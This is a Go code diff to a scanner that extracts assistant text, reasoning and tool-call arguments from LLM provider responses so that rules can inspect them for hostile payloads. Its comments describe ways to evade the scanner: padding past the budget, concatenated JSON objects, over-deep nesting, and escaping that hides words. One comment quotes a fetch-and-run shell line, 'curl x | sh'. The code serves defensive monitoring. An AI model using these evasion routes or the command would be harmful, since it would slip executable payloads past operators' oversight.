@@ -6,6 +6,8 @@ package application
 import (
 	"bytes"
 	"encoding/json"
+	"io"
+	"sort"
 	"strings"
 )
 
@@ -17,12 +19,23 @@ import (
 // budget a provider could send half a megabyte of harmless explanation and every
 // tool call after it would arrive with nothing left to inspect — padding would
 // buy silence for the part that actually gets executed.
+//
+// The budgets are two megabytes each because padding must not buy silence either:
+// whatever is inside the budget is inspected and whatever is past it is forwarded
+// unread, so the limit is the length of padding an attacker needs. Two megabytes of
+// prose is around half a million tokens, which no honest answer reaches, and the
+// engine's literal prefilter is what makes scanning that affordable — at the old
+// price of six seconds per megabyte this ceiling would have been unusable.
 const (
-	maxTextBytes  = 512 * 1024
-	maxToolBytes  = 512 * 1024
+	maxTextBytes  = 2 * 1024 * 1024
+	maxToolBytes  = 2 * 1024 * 1024
 	maxPieces     = 256
 	maxToolNames  = 64
 	maxSourceName = 64
+	// maxLeafBytes bounds the decoded companion pieces together. Decoding is per
+	// accumulator, and the accumulators are already capped, but a deeply nested object
+	// would otherwise be walked into a string longer than the answer it came from.
+	maxLeafBytes = 1024 * 1024
 )
 
 // Piece is one span of text with a safe label saying where it came from.
@@ -37,6 +50,10 @@ type Extraction struct {
 	// ToolNames lists the distinct tools the answer asked the client to run. It is
 	// the signal for the unsolicited-tool anomaly and is metadata, not content.
 	ToolNames []string
+	// Truncated says a budget ran out, so part of the answer reached the client
+	// unread. The operator is told rather than left to assume full coverage: a
+	// provider that pads past the ceiling is buying exactly that assumption.
+	Truncated bool
 }
 
 const (
@@ -44,6 +61,17 @@ const (
 	sourceReasoning = "reasoning_text"
 	sourceToolCall  = "tool_call:"
 )
+
+// sourceKind collapses a source to the kind of place it names. A tool call source
+// carries the call's name, which matters to the operator reading one finding but must
+// not split deduplication: forty differently-named calls restating one payload are one
+// piece of news, and counting them separately would spend the finding budget on it.
+func sourceKind(source string) string {
+	if strings.HasPrefix(source, sourceToolCall) {
+		return sourceToolCall
+	}
+	return source
+}
 
 // Extract reads an answer in whichever dialect it ended up in.
 //
@@ -82,18 +110,47 @@ type collector struct {
 	itemTools map[string]string
 	textBytes int
 	toolBytes int
+	// added counts accepted writes, so a payload no dialect understood can be
+	// recognised and read as plain JSON instead of being dropped.
+	added int
+	// truncated records that something was dropped for want of budget.
+	truncated bool
 }
 
 func (state *collector) result() Extraction {
 	pieces := make([]Piece, 0, len(state.order))
+	leafBudget := maxLeafBytes
 	for _, entry := range state.order {
 		text := entry.builder.String()
 		if strings.TrimSpace(text) == "" {
 			continue
 		}
 		pieces = append(pieces, Piece{Text: text, Source: entry.source})
+		// Tool arguments arrive as JSON, and inside JSON the payload is escaped: a
+		// script written through a write_file call reaches the rules as
+		// `#!/bin/sh\ncurl x | sh` with a literal backslash-n glued to the next token,
+		// so `\bcurl\b` finds no word boundary and the rule written for exactly that
+		// script goes quiet. The decoded strings are offered as their own piece rather
+		// than spliced onto the raw form, which would invent matches at the seam.
+		//
+		// The companions share one budget of their own, so this cannot double the work
+		// of a hostile answer that is JSON all the way down.
+		if leafBudget <= 0 {
+			state.truncated = true
+			continue
+		}
+		decoded := jsonLeaves(text)
+		if decoded == "" {
+			continue
+		}
+		if len(decoded) > leafBudget {
+			decoded = decoded[:leafBudget]
+			state.truncated = true
+		}
+		leafBudget -= len(decoded)
+		pieces = append(pieces, Piece{Text: decoded, Source: entry.source})
 	}
-	return Extraction{Pieces: pieces, ToolNames: state.toolNames}
+	return Extraction{Pieces: pieces, ToolNames: state.toolNames, Truncated: state.truncated}
 }
 
 // add appends text to the accumulator identified by key, creating it on first
@@ -109,10 +166,12 @@ func (state *collector) add(key, source, text string) {
 		spent, limit = &state.toolBytes, maxToolBytes
 	}
 	if *spent >= limit {
+		state.truncated = true
 		return
 	}
 	if remaining := limit - *spent; len(text) > remaining {
 		text = text[:remaining]
+		state.truncated = true
 	}
 	if state.byKey == nil {
 		state.byKey = make(map[string]*accumulator, 8)
@@ -120,6 +179,7 @@ func (state *collector) add(key, source, text string) {
 	entry := state.byKey[key]
 	if entry == nil {
 		if len(state.order) >= maxPieces {
+			state.truncated = true
 			return
 		}
 		entry = &accumulator{source: source}
@@ -128,6 +188,7 @@ func (state *collector) add(key, source, text string) {
 	}
 	entry.builder.WriteString(text)
 	*spent += len(text)
+	state.added++
 }
 
 func (state *collector) noteTool(name string) {
@@ -180,16 +241,82 @@ func (state *collector) readEventStream(body []byte) {
 // readObject tries one JSON object as every shape it might be. A body is only
 // ever one of them, but which one is not knowable from the outside, and trying
 // all three costs one decode of an already-parsed map.
+// readObject reads a payload that should be one JSON value, and copes with it being
+// several or none.
+//
+// A stream of concatenated objects (`{…}\n{…}`, and the same thing with a trailing
+// fragment) is what a gateway produces when it forgets the SSE framing, and it is also
+// the cheapest way to hide: the decoder stops after the first value, so a payload in the
+// second object was never looked at, and a trailing fragment made the shape readers —
+// which parse the WHOLE payload — fail on an answer whose first object was perfectly
+// good. Every value in the stream is read, and anything the decoder could not reach is
+// scanned raw.
 func (state *collector) readObject(payload []byte) {
+	decoder := json.NewDecoder(bytes.NewReader(payload))
+	decoder.UseNumber()
+	var values int
+	for {
+		var raw json.RawMessage
+		if err := decoder.Decode(&raw); err != nil {
+			if err != io.EOF {
+				// Whatever is left is not a JSON value we can read, and the client may still
+				// accept it, so it is scanned as bytes. This includes the case of no value at
+				// all: a body our own parser rejects outright — encoding/json refuses at
+				// 10000 levels of nesting where Python and JavaScript do not, so
+				// `{"choices":[…payload…],"pad":[[[[…20001…]]]]}` is an ordinary answer to
+				// every client and an unreadable one here.
+				//
+				// The remainder is sliced out of the payload rather than read from the
+				// decoder: Buffered() holds only what the decoder had read ahead, 64 KiB of
+				// it, so on a longer body it would hand back a fragment and the rest would go
+				// unscanned with nothing saying so.
+				//
+				// Raw bytes are weaker than the decoded pieces the parsed paths produce: the
+				// payload is still escaped, so a rule anchored on a word boundary can miss
+				// `sh\ncurl`. Weaker is not nothing, and the alternative was a clean verdict
+				// with no note that nothing had been read.
+				rest := payload
+				if values > 0 {
+					if offset := int(decoder.InputOffset()); offset >= 0 && offset < len(payload) {
+						rest = payload[offset:]
+					}
+				}
+				state.add("unparsed", sourceAssistant, string(rest))
+			}
+			break
+		}
+		values++
+		state.readValue(raw)
+	}
+}
+
+// readValue tries one JSON value as every shape it might be. A body is only ever
+// one of them, but which one is not knowable from the outside, and trying all
+// three costs one decode of an already-parsed map.
+func (state *collector) readValue(payload []byte) {
 	var object map[string]json.RawMessage
 	decoder := json.NewDecoder(bytes.NewReader(payload))
 	decoder.UseNumber()
 	if decoder.Decode(&object) != nil {
+		// A valid JSON value that is not an object — an array or a bare string. The shape
+		// readers all expect an object, so its strings are read directly.
+		state.add("unrecognised", sourceAssistant, jsonLeaves(string(payload)))
 		return
 	}
+	before := state.added
 	state.readResponsesShape(payload)
 	state.readChatShape(object)
 	state.readAnthropicShape(object, payload)
+	if state.added > before {
+		return
+	}
+	// No dialect understood this payload, and the client will read it anyway. One
+	// off-spec field type is enough to fail a whole shape and take the assistant text
+	// down with it, so instead of typing every variant of every gateway the strings of
+	// the payload are read as they are. Everything unrecognised shares one
+	// accumulator: an answer whose every event is foreign then costs one extra piece
+	// to scan, not one per event.
+	state.add("unrecognised", sourceAssistant, jsonLeaves(string(payload)))
 }
 
 // --- Responses API -------------------------------------------------------
@@ -277,6 +404,11 @@ func (state *collector) readResponsesItem(item responsesItem) {
 		for index, part := range item.Summary {
 			state.add("responses_item_reasoning_"+key+"_"+itoa(index), sourceReasoning, part.Text)
 		}
+		// Newer reasoning items carry the text under content and the short form under
+		// summary, and a provider may send either.
+		for index, part := range item.Content {
+			state.add("responses_item_reasoning_content_"+key+"_"+itoa(index), sourceReasoning, part.Text)
+		}
 	default:
 		for index, part := range item.Content {
 			if part.Text == "" {
@@ -319,15 +451,21 @@ func (state *collector) readChatShape(object map[string]json.RawMessage) {
 	}
 	var choices []struct {
 		Index json.Number `json:"index"`
+		// Legacy completions put the answer straight on the choice.
+		Text  json.RawMessage `json:"text"`
 		Delta *struct {
-			Content   json.RawMessage `json:"content"`
-			Reasoning json.RawMessage `json:"reasoning_content"`
-			ToolCalls []chatToolCall  `json:"tool_calls"`
+			Content      json.RawMessage `json:"content"`
+			Reasoning    json.RawMessage `json:"reasoning_content"`
+			ReasoningAlt json.RawMessage `json:"reasoning"`
+			Refusal      json.RawMessage `json:"refusal"`
+			ToolCalls    []chatToolCall  `json:"tool_calls"`
 		} `json:"delta"`
 		Message *struct {
-			Content   json.RawMessage `json:"content"`
-			Reasoning json.RawMessage `json:"reasoning_content"`
-			ToolCalls []chatToolCall  `json:"tool_calls"`
+			Content      json.RawMessage `json:"content"`
+			Reasoning    json.RawMessage `json:"reasoning_content"`
+			ReasoningAlt json.RawMessage `json:"reasoning"`
+			Refusal      json.RawMessage `json:"refusal"`
+			ToolCalls    []chatToolCall  `json:"tool_calls"`
 		} `json:"message"`
 	}
 	if json.Unmarshal(raw, &choices) != nil {
@@ -338,14 +476,19 @@ func (state *collector) readChatShape(object map[string]json.RawMessage) {
 		if key == "" {
 			key = itoa(position)
 		}
+		state.add("chat_completion_"+key, sourceAssistant, jsonString(choice.Text))
 		if choice.Delta != nil {
 			state.add("chat_text_"+key, sourceAssistant, jsonString(choice.Delta.Content))
 			state.add("chat_reasoning_"+key, sourceReasoning, jsonString(choice.Delta.Reasoning))
+			state.add("chat_reasoning_alt_"+key, sourceReasoning, jsonString(choice.Delta.ReasoningAlt))
+			state.add("chat_refusal_"+key, sourceAssistant, jsonString(choice.Delta.Refusal))
 			state.readChatToolCalls(key, choice.Delta.ToolCalls)
 		}
 		if choice.Message != nil {
 			state.add("chat_text_"+key, sourceAssistant, jsonString(choice.Message.Content))
 			state.add("chat_reasoning_"+key, sourceReasoning, jsonString(choice.Message.Reasoning))
+			state.add("chat_reasoning_alt_"+key, sourceReasoning, jsonString(choice.Message.ReasoningAlt))
+			state.add("chat_refusal_"+key, sourceAssistant, jsonString(choice.Message.Refusal))
 			state.readChatToolCalls(key, choice.Message.ToolCalls)
 		}
 	}
@@ -355,8 +498,11 @@ type chatToolCall struct {
 	Index    *json.Number `json:"index"`
 	ID       string       `json:"id"`
 	Function *struct {
-		Name      string `json:"name"`
-		Arguments string `json:"arguments"`
+		Name string `json:"name"`
+		// Documented as a string of JSON, sent by some gateways as the object itself.
+		// Typing it strictly would fail the decode of the whole choices array and lose
+		// the assistant text along with the arguments.
+		Arguments json.RawMessage `json:"arguments"`
 	} `json:"function"`
 }
 
@@ -381,7 +527,7 @@ func (state *collector) readChatToolCalls(choiceKey string, calls []chatToolCall
 			state.noteTool(call.Function.Name)
 			state.rememberToolName("chat_"+key, call.Function.Name)
 		}
-		state.add("chat_args_"+key, state.toolSource("chat_"+key), call.Function.Arguments)
+		state.add("chat_args_"+key, state.toolSource("chat_"+key), jsonString(call.Function.Arguments))
 	}
 }
 
@@ -472,6 +618,57 @@ func jsonString(raw json.RawMessage) string {
 		return text
 	}
 	return string(raw)
+}
+
+// jsonLeaves returns every string a JSON object or array holds, decoded and joined
+// by newline, or "" for anything that is not one. It is what lets a rule see the
+// script a tool call carries: inside JSON that script is escaped, and a rule
+// anchored on a word boundary cannot match `sh\ncurl` where the backslash-n is two
+// literal characters.
+//
+// Keys are included with their value. A payload can hide in either, and dropping
+// the keys would also drop the field names that say what the call does.
+func jsonLeaves(text string) string {
+	trimmed := strings.TrimSpace(text)
+	if len(trimmed) < 2 || (trimmed[0] != '{' && trimmed[0] != '[') {
+		return ""
+	}
+	var value any
+	if json.Unmarshal([]byte(trimmed), &value) != nil {
+		return ""
+	}
+	var builder strings.Builder
+	appendJSONLeaves(&builder, value)
+	return builder.String()
+}
+
+func appendJSONLeaves(builder *strings.Builder, value any) {
+	if builder.Len() >= maxLeafBytes {
+		return
+	}
+	switch typed := value.(type) {
+	case string:
+		if builder.Len() > 0 {
+			builder.WriteByte('\n')
+		}
+		builder.WriteString(typed)
+	case []any:
+		for _, item := range typed {
+			appendJSONLeaves(builder, item)
+		}
+	case map[string]any:
+		// Map order is random in Go, and a finding has to be reproducible, so the keys
+		// are walked in order.
+		names := make([]string, 0, len(typed))
+		for name := range typed {
+			names = append(names, name)
+		}
+		sort.Strings(names)
+		for _, name := range names {
+			appendJSONLeaves(builder, name)
+			appendJSONLeaves(builder, typed[name])
+		}
+	}
 }
 
 func truncate(value string, limit int) string {
